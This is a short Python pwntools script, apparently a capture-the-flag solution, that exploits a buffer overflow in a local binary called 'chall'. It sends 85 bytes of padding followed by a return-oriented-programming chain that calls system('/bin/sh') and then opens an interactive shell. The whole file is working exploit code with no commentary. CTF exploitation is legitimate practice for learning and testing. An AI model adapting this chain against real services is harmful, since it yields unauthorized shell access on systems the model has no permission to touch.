from pwn import *

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

rop_bin_sh = 0x478010
rop_system = 0x404ae0
rop_pop_rdi = 0x476f02
rop_ret = 0x4019cc

payload = b'a' * 85
payload += p64(rop_pop_rdi)
payload += p64(rop_bin_sh)
payload += p64(rop_ret)
payload += p64(rop_system)

io.sendline(payload)
io.interactive()

